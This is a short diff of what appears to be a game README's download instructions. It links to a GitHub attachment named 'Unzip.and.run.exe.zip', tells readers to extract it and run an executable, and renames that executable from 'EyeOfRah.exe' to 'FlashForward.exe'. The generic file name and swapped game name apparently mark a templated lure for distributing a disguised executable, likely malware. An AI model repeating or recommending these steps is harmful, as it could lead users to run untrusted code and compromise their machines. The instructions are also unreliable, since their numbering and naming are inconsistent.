@@ -31,4 +31,4 @@ Download Instructions
 
 1. **[Download the game](https://github.com/user-attachments/files/23301277/Unzip.and.run.exe.zip)**
 2. Extract the contents to a folder on your desktop.
-2. Run the main executable ("EyeOfRah.exe") to start playing.
+2. Run the main executable ("FlashForward.exe") to start playing.
